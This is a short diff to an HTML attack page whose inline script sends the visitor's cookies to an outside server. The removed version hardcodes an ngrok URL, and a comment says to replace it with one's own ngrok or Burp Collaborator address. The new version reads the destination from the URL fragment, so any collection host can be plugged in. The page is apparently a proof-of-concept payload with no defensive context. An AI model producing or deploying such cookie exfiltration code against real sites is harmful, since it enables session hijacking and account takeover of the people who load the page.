@@ -3,8 +3,8 @@
 <head>
   <title></title>
   <script>
-    // Replace this with your ngrok server url or burp collaborator url
-    document.location='https://7fce-2409-40f2-141-5e34-28b6-1bd7-47f-b0b1.ngrok-free.app/?cookie='+document.cookie
+    let hashValue = window.location.hash.substring(1);
+    document.location = hashValue+"/cookie?cookie="+document.cookie;
   </script>
 </head>
 <body>
